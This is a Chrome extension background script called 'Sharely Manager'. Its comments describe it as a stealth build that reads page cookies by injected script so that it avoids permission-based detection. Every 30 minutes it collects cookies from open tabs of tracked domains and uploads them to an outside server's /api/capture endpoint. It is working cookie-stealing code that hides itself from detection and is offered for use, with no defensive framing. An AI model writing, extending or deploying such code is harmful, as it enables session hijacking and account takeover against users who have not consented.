/* background.js — Sharely Manager (Admin) v1.1 */
/* Stealth build: no chrome.cookies API. Uses chrome.scripting.executeScript
   to read document.cookie from page context, bypassing permission-based detection. */

const DEFAULT_SERVER_URL = 'https://sharely-production-bc58.up.railway.app';
const ALARM_NAME = 'sharely-heartbeat';
const HEARTBEAT_MINUTES = 30;

// ── Storage helpers ───────────────────────────────────────────────────────────

async function loadStorage() {
  return new Promise(resolve =>
    chrome.storage.local.get(
      ['serverUrl', 'apiKey', 'trackedDomains', 'cookieHashes', 'syncLog'],
      resolve
    )
  );
}

async function saveStorage(data) {
  return new Promise(resolve => chrome.storage.local.set(data, resolve));
}

// ── Domain helpers ────────────────────────────────────────────────────────────────────

function rootDomain(hostname) {
  const parts = hostname.replace(/^\./, '').split('.');
  return parts.length >= 2 ? parts.slice(-2).join('.') : hostname;
}

function domainMatches(watchDomain, tabHostname) {
  const watch = watchDomain.replace(/^www\./, '').replace(/^\./, '').toLowerCase();
  const host = tabHostname.replace(/^www\./, '').toLowerCase();
  return host === watch || host.endsWith('.' + watch) || watch.endsWith('.' + host);
}

// ── Cookie reading via page context (no chrome.cookies permission) ───────────────

/**
 * Reads document.cookie from a tab by injecting a content-script function.
 * This avoids the chrome.cookies API entirely — no permission footprint.
 */
async function readCookiesFromTab(tabId) {
  try {
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId },
      func: () => {
        // Read all visible cookies from the page context
        const raw = document.cookie || '';
        const pairs = raw.split(/;\s*/).filter(Boolean);
        return pairs.map(pair => {
          const idx = pair.indexOf('=');
          const name = idx > 0 ? pair.slice(0, idx) : pair;
          const value = idx > 0 ? pair.slice(idx + 1) : '';
          return { name, value };
        });
      },
    });
    return result || [];
  } catch (e) {
    console.warn('[SM] Failed to read cookies from tab', tabId, e.message);
    return [];
  }
}

/**
 * Hash a list of cookie {name,value} objects for change-detection.
 */
function hashCookies(cookies) {
  const str = cookies
    .slice()
    .sort((a, b) => a.name.localeCompare(b.name))
    .map(c => `${c.name}=${c.value}`)
    .join('|');
  let h = 5381;
  for (let i = 0; i < str.length; i++) {
    h = ((h << 5) + h) ^ str.charCodeAt(i);
    h >>>= 0;
  }
  return h.toString(16);
}

// ── Find an open tab for a domain ───────────────────────────────────────────────────

async function findTabForDomain(domain) {
  const tabs = await chrome.tabs.query({});
  for (const tab of tabs) {
    if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('about:')) continue;
    try {
      const url = new URL(tab.url);
      if (domainMatches(domain, url.hostname)) return tab;
    } catch { /* ignore */ }
  }
  return null;
}

// ── Upload ────────────────────────────────────────────────────────────────────

async function uploadCookies(domain, cookies, serverUrl, apiKey, label) {
  const cleanDomain = domain.replace(/^www\./, '').replace(/^\./, '');
  const payload = {
    domain: cleanDomain,
    label: label || `Auto-sync ${new Date().toLocaleString('en-US', { month:'short', day:'numeric', hour:'2-digit', minute:'2-digit' })}`,
    cookies: cookies.map(c => ({
      name: c.name,
      value: c.value,
      domain: `.${cleanDomain}`,
      path: '/',
      secure: true,
      httpOnly: false,
      expirationDate: 0,
      sameSite: 'no_restriction',
    })),
  };

  const res = await fetch(`${serverUrl}/api/capture`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-API-Key': apiKey,
    },
    body: JSON.stringify(payload),
  });

  if (!res.ok) {
    const text = await res.text();
    throw new Error(`Server ${res.status}: ${text}`);
  }
  return res.json();
}

// ── Sync a single domain ─────────────────────────────────────────────────────────

async function syncDomain(domain, { forced = false } = {}) {
  const stored = await loadStorage();
  const serverUrl = (stored.serverUrl || DEFAULT_SERVER_URL).replace(/\/+$/, '');
  const apiKey = stored.apiKey || '';
  const hashes = stored.cookieHashes || {};
  const log = stored.syncLog || [];

  if (!apiKey) {
    console.warn('[SM] No API key — skipping sync for', domain);
    return { skipped: true, reason: 'no_api_key' };
  }

  const tab = await findTabForDomain(domain);
  if (!tab) {
    console.log('[SM] No open tab for', domain, '— skipping (tab must be open for stealth read)');
    return { skipped: true, reason: 'no_tab' };
  }

  const rawCookies = await readCookiesFromTab(tab.id);
  if (rawCookies.length === 0) {
    console.log('[SM] No readable cookies for', domain);
    return { skipped: true, reason: 'no_cookies' };
  }

  const hash = hashCookies(rawCookies);
  if (!forced && hashes[domain] === hash) {
    console.log('[SM] Cookies unchanged for', domain);
    return { skipped: true, reason: 'unchanged' };
  }

  try {
    const result = await uploadCookies(domain, rawCookies, serverUrl, apiKey);
    hashes[domain] = hash;

    const entry = {
      domain,
      count: result.count,
      label: result.label,
      ts: Date.now(),
      ok: true,
    };
    const newLog = [entry, ...log].slice(0, 50);
    await saveStorage({ cookieHashes: hashes, syncLog: newLog });

    console.log('[SM] Synced', rawCookies.length, 'cookies for', domain);
    return { success: true, count: result.count, label: result.label };
  } catch (err) {
    const entry = { domain, error: err.message, ts: Date.now(), ok: false };
    const newLog = [entry, ...log].slice(0, 50);
    await saveStorage({ syncLog: newLog });
    console.error('[SM] Upload failed for', domain, err.message);
    return { success: false, error: err.message };
  }
}

// ── Heartbeat: sync all tracked domains ──────────────────────────────────────────────────────

async function heartbeat(forced = false) {
  const stored = await loadStorage();
  const domains = stored.trackedDomains || [];
  console.log('[SM] Heartbeat — syncing', domains.length, 'domains');
  for (const domain of domains) {
    await syncDomain(domain, { forced });
  }
}

// ── Alarm setup ────────────────────────────────────────────────────────────────────

chrome.runtime.onInstalled.addListener(async () => {
  console.log('[SM] Installed — setting up heartbeat alarm');
  chrome.alarms.create(ALARM_NAME, {
    delayInMinutes: HEARTBEAT_MINUTES,
    periodInMinutes: HEARTBEAT_MINUTES,
  });
  const stored = await loadStorage();
  if (!stored.serverUrl && DEFAULT_SERVER_URL) {
    await saveStorage({ serverUrl: DEFAULT_SERVER_URL });
  }
});

chrome.alarms.onAlarm.addListener(alarm => {
  if (alarm.name === ALARM_NAME) heartbeat(false);
});

// ── Message handler (from popup) ───────────────────────────────────────────────────────────

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {

  // Sync a specific domain now
  if (message.type === 'SYNC_DOMAIN') {
    syncDomain(message.domain, { forced: true })
      .then(result => sendResponse(result))
      .catch(err => sendResponse({ success: false, error: err.message }));
    return true;
  }

  // Sync all tracked domains
  if (message.type === 'SYNC_ALL') {
    heartbeat(true)
      .then(() => sendResponse({ success: true }))
      .catch(err => sendResponse({ success: false, error: err.message }));
    return true;
  }

  // Get cookies for the active tab (popup preview)
  if (message.type === 'GET_ACTIVE_COOKIES') {
    const run = async () => {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab || !tab.url || tab.url.startsWith('chrome://')) {
        return { domain: null, count: 0 };
      }
      const url = new URL(tab.url);
      const domain = rootDomain(url.hostname);
      const cookies = await readCookiesFromTab(tab.id);
      return { domain, hostname: url.hostname, count: cookies.length, tabTitle: tab.title || domain };
    };
    run().then(r => sendResponse(r)).catch(err => sendResponse({ error: err.message }));
    return true;
  }
});
